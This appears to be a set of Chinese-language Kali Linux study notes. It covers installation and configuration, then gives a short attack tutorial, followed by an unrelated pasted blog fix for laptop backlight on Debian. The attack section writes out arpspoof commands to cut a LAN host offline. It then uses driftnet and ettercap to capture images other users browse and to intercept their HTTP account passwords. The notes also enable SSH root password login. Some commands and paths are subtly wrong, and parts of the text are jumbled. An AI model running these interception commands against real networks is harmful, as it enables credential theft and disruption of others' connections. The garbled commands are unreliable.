                                                Kali学习笔记

## 1.环境的搭建

### 1.1虚拟机搭建 

物理机要求：  I3同级或者更高级
内存 不小于2G （最低要求）8G 略显紧凑 16G  上天。。
硬盘 只是玩玩的话用32G左右就好  长期玩 不小于80G 

物理机电脑如果是 32位 用vm10版本的 64位 用12版本的 
我不会告诉你 可以右键我的电脑 属性 能看到位数的 

先去bios 确认开启了虚拟化 
然后安装虚拟机  
百度有序列号 不强调 
在桌面的虚拟机图标 右键 属性 兼容性 兼容当前操作系统  并且以管理员身份运行


物理机安装的话 需要先确定 cpu是amd的 还是 inter的  这两个有区别  
首先 amd的 cpu 尽量安装 amd 64位的镜像  inter的cpu 尽量安装i386的镜像 口映射太麻烦，监听的时候 可能会被防火墙拦截 或者无法转发，抓包的时候一大堆物理机的数据包 一小部分是局域网下的 
物理机安装kali物理硬件 性能最大化利用，端口映射简单 方便 
缺点 最主要的是兼容性问题，太坑，除非必要 真心不建议装 或者当前版本不建议（等待官方的更新）再就是 独立显卡驱动 很麻烦 也很鸡肋 
在者 不建议 物理机安装 因为会有很多故障 或者不兼容的情况  
首先用软碟通打开镜像 然后选择存储介质 烧录 然后 重启 更改bios的启动项 设置成 U盘启动 然后 进入到kali安装界面 选择倒数第三项（图形化安装）
剩下的不多叙述 和虚拟机安装方法 大同小异
注意要点：
* 第一  物理机和虚拟机各有优缺点 
虚拟机能快照还原 配置方便 物理硬件更改方便 
缺点，端
* 第二 物理机安装 注意好盘符分区 一定不要弄错了 
* 第三 引导位置，尤其是双硬盘的玩家 一定要注意 引导放在那里
* 第四 如果物理机安装的时候 提示探测不到光盘 请把 未解压的iso镜像放到u盘一份 还是探测不到 请把U盘重新插拔 再探测 还是不行 就去安装的shell里面  df -hl 查看当前挂载点 ，然后 umount
加上最后一行  再执行就好了 
* 第五 如果 你对你的网络不自信 就别用网络镜像更新 很多人都是卡死在这里 
* 第六 记好root密码 忘了  呵呵 重做吧 


#### 1.1.1安装vmtool
（方法1）apt-get install open-vm-tools-desktop fuse #kali2.0后最好使用此方法

（方法2）在虚拟机选项栏 找到虚拟机选项 下拉菜单中 找到 安装vmtool 
在空白处右键  在终端打开
 先 ls 查看下 当前目录下的所有文件 
 切换到vm目录 执行安装文件  
Vmware-install.pl 是安装文件  vmware-install.real.pl 是卸载文件 


## 1.2 kali虚拟机的配置
#### 1.2.1 更新源的修改
  （最好不要更改，就用官方源，但是其中有些中文的软件安装包没有）

终端修改 /etc/apt/sources.list文件 ，用Nano、vim都可以

```shell
#kali官方源
deb http://http.kali.org/kali kali-rolling main non-free contrib
#中科大的源
deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib


依次执行下面命令： 
apt-get update & apt-get upgrade   更新并升级 
apt-get dist-upgrade 
reboot
```

#### 1.2.2安装 输入法
```shell
apt-get install fcitx fcitx-googlepinyin
```
16.2版本更新了之后 在桌面右上角的设置去找输入法的配置
 
#### 1.2.3字体重叠解决 办法
```
apt-get install -y ttf-wqy-microhei ttf-wqy-zenhei xfonts-wqy
```
#### 1.2.4安装 vpn代理工具 （选装 后期才会涉及到翻墙）
```
apt-get install network-manager-openvpn-gnome
apt-get install network-manager-pptp
apt-get install network-manager-pptp-gnome
apt-get install network-manager-strongswan
apt-get install network-manager-vpnc
apt-get install network-manager-vpnc-gnome
```
#### 1.2.5安装 flash 
```
方法一：物理机不一定有用
apt-get install flashplugin-nonfree
update-flashplugin-nonfree --install

方法二：
下载flash linux压缩包
flash_player_npapi_linux.x86_64.tar.gz
选择NPAPI的压缩包（即里面含有usr的）
解压后进入文件夹
cp libflashplayer.so /usr/lib/mozilla/plugins/
cp -r usr/* /usr

```
#### 1.2.6安装nload流量分析工具
```
Apt-get install nload
```
#### 1.2.7修改ettercap配置文件
```
Nano /etc/ettercap/etter.conf 
```
把 ec_uid 、ec_gid的值 改成0 
Ctrl +x 是退出  然后她会询问你是否保存  按 y 然后 她会问你保存的文件名  这块直接回车就好  


#### 1.2.8 Ssh 配置文件修改 
```
nano /etc/ssh/sshd_config 
将#PasswordAuthentication no的注释去掉，并且将NO修改为YES //kali中默认是yes
将PermitRootLogin without-password修改为
   PermitRootLogin yes
```

* Ssh 开机自启 
格式  
```
Update-rc.d 服务 enable //（开启）disabled 关闭
update-rc.d ssh enable  //系统自动启动SSH服务
update-rc.d ssh disabled // 关闭系统自动启动SSH服务
```
完成以上步骤 且确保无误并拍摄快照

#### 1.2.9 kali物理机声卡问题（亲测）

#其实并不是不支持声卡驱动了。
#只是root用户下默认关闭。
```
systemctl --user enable pulseaudio  
```

leafpad 编辑 /etc/default/pulseaudio 写入以下两行即可。
#root下是默认关闭声卡驱动的， 开机自动开启
```
PULSEAUDIO_SYSTEM_START=1
DISALLOW_MODULE_LOADING=0
```
reboot




# &.Kali系统渗透实战教程

## &.1：局域网断网攻击讲解
注：arp攻击 ，使局域网内某机器断网！  
原理：使目标的ip经过我的网卡，从网关出去，
如果可以从网关出去，就是arp欺骗
如果配置错误，不能从网关出去，经形成断网攻击
Arpspoof

Arpspoof  -i 网卡 -t 目标IP 网关


Kali : 网卡  eth0
目标ip ：192.168.1.100
网关：192.168.1.1


替换掉： arpspoof -i eth0 -t 192.168.1.100  192.168.1.1

怎么看局域网当中的ip呢   

fping -asg 192.168.1.0/24


echo 1 > /proc/net/sys/ipv4/ip_forward

注：echo  写入命令不会有回显

## &.2：图片拦截
driffnet  截取经过网卡的图片
命令：driffnet -i eth0
通过与arp欺骗，
echo 1 > /proc/net/sys/ipv4/ip_forward
arpspoof -i eth0 -t 192.168.1.100  192.168.1.1

可以获取内网别人浏览过的一些图片
## &.3：http账号密码的截取
在公司我已经学会用wireshark进行用户账号密码的抓包分析，现在通过arp欺骗在用ettercap进行拦截
思路:先进行arp欺骗，然后进行拦截
命令：
执行arp欺骗：
echo 1 > /proc/net/sys/ipv4/ip_forward
arpspoof -i eth0 -t 192.168.1.100  192.168.1.1
ettercap -Tq -i eth0（其中T代表以文本格式，q是以安静模式）
当然也可以以图形化界面的方式来进行，最终截图的如下列：
 
![http](https://github.com/jitianze/yanzixu/blob/master/picture/1.png)


## &.4：https 账号密码的截取







## kali启动metasploit framework
kali 2.0 已经没有metasploit 这个服务了，所以service metasploit start 的方式不起作用。
在kali 2.0中启动带数据库支持的MSF方式如下：

1  首先启动postgresql数据库：/etc/init.d/postgresql start；或者 service postgresql start；

2  初始化MSF数据库（关键步骤！）：msfdb init；

3  运行msfconsole：msfconsole；

4  在msf中查看数据库连接状态：db_status。


## kali亮度调节

#echo 10>/sys/class/backlight/intel_backlight/backlightness

debian8系统，存在很多不兼容问题，官方更新较慢，但是电脑的硬件，更新快，很多驱动都无法在系统安装时给装好，我装debian8系统时，出了很多问题。

例如，没有声音，没有wifi，没有亮度调节，中文输入法问题等等。我搞了很久，才把这个系统完美的装在我的电脑上。

     本文主要分享，我如何解决dell电脑 debian8系统,gnome亮度调节问题，以后有时间在写其他的几个问题解决经验，纯属个人经验，有叙述不当的地方，请包容，指点。

步骤还是很全的，请根据编号，进行查看。

在解决问题前，大家可以更新一下源http://guanglin.blog.51cto.com/3038587/1689670，和系统。

#gedit  /etc/apt/sources.list

把163源，添加到末尾，保存退出；

#aptitude update     //可以多执行几次，有些源有时连不上的，就自动忽略了；

#apt-get install firmware-Linux-free

#apt-get install firmware-linux

#apt-get install firmware-linux-nonfree

#aptitude update&&aptitude upgrade

#reboot

重启时等待系统更新自动关闭，不要强制关机；

1,查看系统是否安转了相应驱动

~su

#cd /sys/class/backlight

#ls

1.1如果显示为  apci_video0

说明系统未能正确识别，电脑的驱动。

#vi  /etc/default/grub

修改GRUB_CMDLINE_LINUX=“”为

        GRUB_CMDLINE_LINUX="apci_osi=Linux apci_backlight=vendor"

#update-grub

#reboot

重启后

~su

#cd /sys/class/backlight

#ls

1.1 ,如果显示为 apci_viedo0 和另一个文件夹，如intel_backlight   ,下面将全部用该文件名举例子，其他的适用，如dell_backlight

恭喜你，系统已经识别到了你的显卡驱动。（每个电脑显示的文件都不同，大家自行举一反三）

如果可以通过FN+亮度按键调节   over；

1.2，如果不可以则不能调节的原因可能是，我们调节亮度时，系统只能修改apci_viedo0/backlightness，而不能修改Intel_backlight/backlightness

而起作用的是后者；

可以自己测试：

#cat  /sys/class/backlight/apci_video0/backlightness

按一下fn+亮度按键。在执行上一个命令。=，你会发现，已经修改。

但是真正能修改背景亮度的是Intel_backlight/backlightness

可以自行测试：

#echo 10>/sys/class/backlight/intel_backlight/backlightness

2，如果1.2测试成功，已经成功一半了。接下来有三种方案

2.1，我们调节亮度时，可以执行命令直接调节：

#sudo echo 10>/sys/class/backlight/intel_backlight/backlightness

2.2,我们也可以写一个shell，去控制,这个简单的shel我就不写出来了，根据以上内容你可以写出来的，我相信你。

2.3，就希望通过系统的调节条和fn+按键调节（像我这样的吹毛求疵的，悲剧是，试了很多，都失败了，还重装了几次系统）

但是我最终还是解决了这个问题，请看：

原理就是，我们调用系统的机制来完成这个事，具体什么机制我也不懂，类似select轮训资源，等待资源就绪，在执行相关动作的机制吧，我们就叫它弯道超车吧

2.3.1，在/etc/udev/rules.d/目录创建一个规则：（改规则就是当我们改变系统亮度条或者fn+亮度键时，执行后面的shell程序）

#sudo vi  /etc/udev/rules.d/99-writemybacklight.rules   

写上 SUBSYSTEM=="backlight", ACTION=="change", RUN+="/usr/sbin/writemybacklight.sh"

我们在/usr/sbin/下新建一个 /writemybacklight.sh                                           / /shell程序可以自己命名，但要和上面保持一致

#sudo vi /usr/sbin/writemybacklight.sh    

写上

#!/bin/bash
intelmaxbrightness=`cat /sys/class/backlight/intel_backlight/max_brightness`
acpimaxbrightness=`cat /sys/class/backlight/acpi_video0/max_brightness`
scale=$(intelmaxbrightness/acpimaxbrightness)
acpibrightness=`cat /sys/class/backlight/acpi_video0/brightness`
newintelbrightness=$(acpibrightness*scale)
curintelbrightness=`cat /sys/class/backlight/intel_backlight/actual_brightness`
if [ $newintelbrightness -ne $curintelbrightness ]
then
echo $newintelbrightness > /sys/class/backlight/intel_backlight/brightness
fi
exit 0

这个shell'程序借鉴http://forum.ubuntu.org.cn/viewtopic.PHP?t=438341&p=2995988，该网站给的不能直接用，shell有问题，这是我修改了以后的。纯手打的，可能也有问题，只要你读懂这个shell，你就可以根据你的目录自行写出了。

写好后，保存退出，改一下权限

#chmod 777 /usr/sbin/writemybacklight.sh   
可以用你的亮度进度条试试了，是不是很开心呢。

3，如果你执行1之后，只有一个目录名，如dell_backlight.

请执行辅助那几部，执行后，会多出一个目录，如radeon_pl0,

这个两个目录的dell_backlight相当于apci_video0,radeon_pl0相当于intel_backlight.

继续执行1之后的步骤测试。


